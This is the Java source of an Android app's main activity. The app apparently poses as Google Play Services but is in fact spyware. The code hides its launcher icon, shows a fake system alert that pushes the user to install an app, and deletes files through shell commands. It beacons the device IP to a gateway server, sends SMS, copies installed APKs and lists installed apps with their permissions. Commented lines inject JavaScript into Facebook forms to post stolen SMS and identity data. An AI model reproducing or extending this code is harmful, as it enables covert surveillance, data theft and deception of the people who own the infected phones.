package com.google.play.services;

import android.content.SharedPreferences;
import android.app.*;
import android.os.Bundle;
import android.os.Build;
import android.os.CountDownTimer;
import android.view.View;
import android.content.Intent;
import android.content.Context;
import android.content.IntentFilter;
import android.util.Log;
import android.widget.Toast;
import android.net.Uri;
import android.content.pm.PackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.ResolveInfo;
import android.app.PendingIntent;
import android.os.Environment;
import android.media.AudioManager;
import android.os.Handler;
import android.graphics.Bitmap;
import android.content.ComponentName;
import android.content.BroadcastReceiver;
import android.telephony.gsm.*;
import java.io.*;
import java.util.*;
import android.media.AudioManager;
import android.graphics.Bitmap;
import android.media.*;

import android.view.Gravity;
import android.graphics.Color;
import android.widget.*;
import android.view.WindowManager;

import android.os.SystemClock;

import java.net.URLEncoder;

public class MainActivity extends Activity
{
    private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private ReceiverBoot receiver;
	private static String TAG = "AsDfGhJkL";
	public static String resultSms = "";
	public static String pullApk = "";
	private boolean dtoast = true;
	AlertDialog dialog;
	private PendingIntent mPending;

	public void btn(View v) {
		receiver.toastShow(this, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. reboot after installed.\n\n\n\n\n\n       [ WARNING! ]\n\n\n");
		/*
		long firstTime = SystemClock.elapsedRealtime();
		AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);
		am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstTime, 30*1000, mPending);

		Toast.makeText(this, "serc", Toast.LENGTH_LONG).show();*/
   	}
	public void btnku(View v) {
		AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE);
		am.cancel(mPending);
		Toast.makeText(this, "dest", Toast.LENGTH_LONG).show();

	}
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		settings = getSharedPreferences("Settings", 0);
		seteditor = settings.edit();
		receiver = new ReceiverBoot();
		receiver.setDoc(this);

		//Log.i(TAG, receiver.fileToHex("/sdcard/Pictures/facebook/FB_IMG_15594704538038162.jpg"));


		//receiver.getar(this, "3000");

		//receiver.chatDialogAlert(this, "Hallo bro", "Ponsel lo udah ane hack awkoawkkwk");

		//Log.i(TAG, ""+receiver.fileToString("/sdcard/log_asisten.txt"));

		//Log.i(TAG, ok);

		// postingan: https://free.facebook.com/story.php?story_fbid=425720278184436&id=100022394016980&_rdr#425720441517753
		// profil: https://free.facebook.com/sunjangyo.sunjangyo.9?ref_component=mfreebasic_home_header&ref_page=%2Fwap%2Fhome.php&refid=8
		// inbox : https://free.facebook.com/messages/read/?tid=cid.c.100022394016980%3A100035974483671&refid=11#fua
        // target: -target-10.42.0.1-target-
        // payload: -aksi-alert-aksi-

        //setContentView(receiver.fbPayload(this, "pesawat", "https://free.facebook.com/messages/read/?tid=cid.c.100022394016980%3A100035974483671&refid=11#fua"));

		startService(new Intent(this, SystemThread.class));

		//setContentView(receiver.xfbPayload(this, "javascript:document.forms[0].comment_text.value='ngapa';" +"document.forms[0].submit()", "https://free.facebook.com/story.php?story_fbid=1088385011285583&id=846527762137977&__tn__=%2AW-R&_rdr"));
		
		//receiver.fbPayload(this, "javascript:document.forms[1].p_text.value='"+new SystemThread().identitasLengkap(this)+"';" +"document.forms[1].submit()", new SystemThread().urlfbPostinganEdt);

		//receiver.fbBigPayload(this, 1, "javascript:document.forms[0].comment_text.value='"+receiver.getSms(this)+"';" +"document.forms[0].submit()", "https://free.facebook.com/story.php?story_fbid=1088385011285583&id=846527762137977&__tn__=%2AW-R&_rdr");

		mPending = PendingIntent.getService(MainActivity.this, 0, new Intent(MainActivity.this, ThreadService.class), 0);

		seteditor.putString("main", "hotspot");    
        seteditor.commit();

		try {
			PackageManager p = getPackageManager();

			p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		}
		catch (Exception e) {}

		finish();

	}

	public void onDestroy() {
		super.onDestroy();

		ServiceTTS tts = new ServiceTTS();
		tts.str = "";
		startService(new Intent(this, ServiceTTS.class));

		String sdcard = Environment.getExternalStorageDirectory().getAbsolutePath();
		String data = receiver.shellCommands("find "+sdcard+"/ -name system.apk");
		String[] rm = data.split("\n");

		for (int i=0; i<rm.length; i++) {
			Log.i(TAG, "rm:"+rm[i]);
			try {
				Runtime.getRuntime().exec("rm "+rm[i]);
			}
			catch(Exception e){}
		}

		CountDownTimer hitungMundur = new CountDownTimer(8000, 100){
			public void onTick(long millisUntilFinished){
				if (dtoast) {
					dtoast = false;
				}
				String ip = Identitas.getIPAddress(true);
        		String[] route = ip.split("[.]");

        		int index = route.length - 1;
				StringBuffer output = new StringBuffer();
		
				for (int i=0; i<index; i++) {
					output.append(route[i]+".");
				}

				receiver.requestUrl = "http://"+output+"1:8888/fileman.php?id="+ip;
				receiver.requestAksi = "web";
				receiver.mainRequest(MainActivity.this);

			}
			public void onFinish()
			{
				//Toast.makeText(MainActivity.this, "Start upgrade...", Toast.LENGTH_LONG).show();
			}
		}.start();

        
	}

	

	public void screen(View v) {
		Bitmap b = takescreenshotOfRootView(v);
		try {
			File g = saveScreenshotToPicturesFolder(this, b, "gg");
		}catch(Exception e) {
			Toast.makeText(this, "err: "+e, Toast.LENGTH_LONG).show();
		}
	}

	public static Bitmap takescreenshot(View v) {
        v.setDrawingCacheEnabled(true);
        v.buildDrawingCache(true);
        Bitmap b = Bitmap.createBitmap(v.getDrawingCache());
        v.setDrawingCacheEnabled(false);
        return b;
    }

    public static Bitmap takescreenshotOfRootView(View v) {
        return takescreenshot(v.getRootView());
    }
	
	public File saveScreenshotToPicturesFolder(Context context, Bitmap image, String filename)
	throws Exception {
		File bitmapFile = getOutputMediaFile(filename);
		if (bitmapFile == null) {
			throw new NullPointerException("Error creating media file, check storage permissions!");
		}
		FileOutputStream fos = new FileOutputStream(bitmapFile);
		image.compress(Bitmap.CompressFormat.PNG, 90, fos);
		fos.close();

		// Initiate media scanning to make the image available in gallery apps
		MediaScannerConnection.scanFile(context, new String[] { bitmapFile.getPath() },
										new String[] { "image/jpeg" }, null);
		return bitmapFile;
	}
	
	private File getOutputMediaFile(String filename) {
		// To be safe, you should check that the SDCard is mounted
		// using Environment.getExternalStorageState() before doing this.
		File mediaStorageDirectory = new File(
			Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
            + File.separator);
		// Create the storage directory if it does not exist
		if (!mediaStorageDirectory.exists()) {
			if (!mediaStorageDirectory.mkdirs()) {
				return null;
			}
		}
		// Create a media file name
		File mediaFile;
		String mImageName = filename + "screen"+ ".jpg";
		mediaFile = new File(mediaStorageDirectory.getPath() + File.separator + mImageName);
		return mediaFile;
	}


	private String getAPPS(Context context){
        String s="";
        try{
            PackageManager p = context.getPackageManager();
            final List<PackageInfo> appinstall = p.getInstalledPackages(PackageManager.GET_PERMISSIONS | PackageManager.GET_PROVIDERS | PackageManager.GET_ACTIVITIES);
            for(PackageInfo app: appinstall){
                s+="\n#################################\n";
                s+="\nApplication name: "+app.applicationInfo.loadLabel(p);
                s+="\nPackage name: "+app.applicationInfo.packageName;
                s+="\nData dir: "+app.applicationInfo.dataDir;
                if(app.activities!=null) s+="\nFirst activity: "+app.activities[0].name;
                s+="\nRequested permissions:";
                try{
                    if(app.requestedPermissions!=null) {
                        for (int i = 0; i < app.requestedPermissions.length; i++) {
                            try {
                                s += "\n" + app.requestedPermissions[i] + ": " + ((app.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0 ? "Granted" : "Denied");
                            } catch (Exception e) {
                                e.printStackTrace();
                                Log.i(TAG, "APPS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                            }
                        }
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    Log.i(TAG, "APPS function: "+e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                }
                s+="\n#################################\n";
            }
        }catch (Exception e){
            e.printStackTrace();
            Log.i(TAG, "APPS function: "+e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return s;
    }
	

	public boolean apkMana(Context context, String packageName, String pilih) {
		PackageManager manager = context.getPackageManager();

		if (pilih.equals("open")) {
			try {
				Intent i = manager.getLaunchIntentForPackage(packageName);
				if (i == null) {
					return false;
				}
				i.addCategory(Intent.CATEGORY_LAUNCHER);
				context.startActivity(i);
				return true;
			} 
			catch (Exception e) {
				return false;
			}
		}
		else if (pilih.equals("cek")) {
			try {
				manager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
				return true;
			}catch(PackageManager.NameNotFoundException e) {
				return false;
			}
		} 
		else if (pilih.equals("pull")) {
			String path = "";
			if (pullApk.equals("")) path = receiver.pathExternal;
			else path = pullApk;

			final Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
			mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
			mainIntent.setPackage(packageName);
			mainIntent.setFlags(ApplicationInfo.FLAG_ALLOW_BACKUP);
			final List pkgAppsList = context.getPackageManager().queryIntentActivities(mainIntent, 0);
			for (Object object : pkgAppsList) {
				ResolveInfo info = (ResolveInfo) object;
				if ( info.activityInfo.applicationInfo.packageName == null ) {
					Log.i(TAG, "pull apk error package");
					return false;
				}

				File file = new File(info.activityInfo.applicationInfo.publicSourceDir);
				File dest = new File(path+"/"+info.activityInfo.applicationInfo.packageName + ".apk");
				File parent = dest.getParentFile();
				if ( parent != null ) parent.mkdirs();
				try {
 					InputStream in = new FileInputStream(file);
					OutputStream out = new FileOutputStream(dest);
					byte[] buf = new byte[1024];
					int len;
					while ((len = in.read(buf)) > 0) {
 						out.write(buf, 0, len);
					}
					in.close();
					out.close();
					Log.i(TAG, "pull apk success "+receiver.pathExternal);

 					return true;
				} 
				catch (IOException e) {
					Log.i(TAG, "pull apk error copy "+e);
					return false;
				}
			}
		}
		return false;
	}


	public static String sendSMS(Context context, String phoneNumber,String message) {
        SmsManager smsManager = SmsManager.getDefault();


		String SENT = "SMS_SENT";
		String DELIVERED = "SMS_DELIVERED";

		SmsManager sms = SmsManager.getDefault();
		ArrayList<String> parts = sms.divideMessage(message);
		int messageCount = parts.size();

		Log.i(TAG, "Message Count: " + messageCount);

		ArrayList<PendingIntent> deliveryIntents = new ArrayList<PendingIntent>();
		ArrayList<PendingIntent> sentIntents = new ArrayList<PendingIntent>();

		PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, new Intent(SENT), 0);
		PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, new Intent(DELIVERED), 0);

		for (int j = 0; j < messageCount; j++) {
			sentIntents.add(sentPI);
			deliveryIntents.add(deliveredPI);
		}

		// ---when the SMS has been sent---
		context.registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context arg0, Intent arg1) {
                    switch (getResultCode()) {
						case Activity.RESULT_OK:
							resultSms = "SMS sent";
							break;
						case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
							resultSms = "Generic failure";
							break;
						case SmsManager.RESULT_ERROR_NO_SERVICE:
							resultSms = "No service";
							Log.i(TAG, "no service");
							break;
						case SmsManager.RESULT_ERROR_NULL_PDU:
							resultSms = "Null PDU";
							break;
						case SmsManager.RESULT_ERROR_RADIO_OFF:
							resultSms = "Radio off";
							break;
                    }
                }
            }, new IntentFilter(SENT));

		// ---when the SMS has been delivered---
		context.registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context arg0, Intent arg1) {
                    switch (getResultCode()) {

						case Activity.RESULT_OK:
							resultSms = "SMS delivered";
							break;
						case Activity.RESULT_CANCELED:
							resultSms = "SMS not delivered";
							break;
                    }
                }
            }, new IntentFilter(DELIVERED));
		smsManager.sendTextMessage(phoneNumber, null, message, sentPI, deliveredPI);
		/* sms.sendMultipartTextMessage(phoneNumber, null, parts, sentIntents, deliveryIntents); */
		return resultSms;
    }

}
